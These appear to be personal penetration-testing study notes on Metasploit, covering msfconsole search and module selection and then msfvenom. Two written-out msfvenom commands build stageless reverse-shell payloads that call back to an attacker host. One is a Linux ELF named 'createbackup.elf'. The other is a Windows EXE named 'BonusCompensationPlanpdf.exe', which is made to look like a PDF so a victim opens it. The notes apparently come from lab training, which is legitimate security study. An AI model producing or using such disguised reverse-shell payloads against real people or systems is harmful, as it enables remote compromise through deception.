
launch 
```
sudo msfconsole 
```
searching database
```
search <service> 
search smb
```
select from list and view options
```
use <list-number>
options 
```

meterpreter    means you have a shell 
```
shell
```

## MSFvenom
list payloads
```
msfveno -l payloads 
```

### Stageless Payloads 
#shells
[[Filetypes]]
create a revese shell linux
```shell-session
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
.elf 
create a reverse shell windows 
```shell-session
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```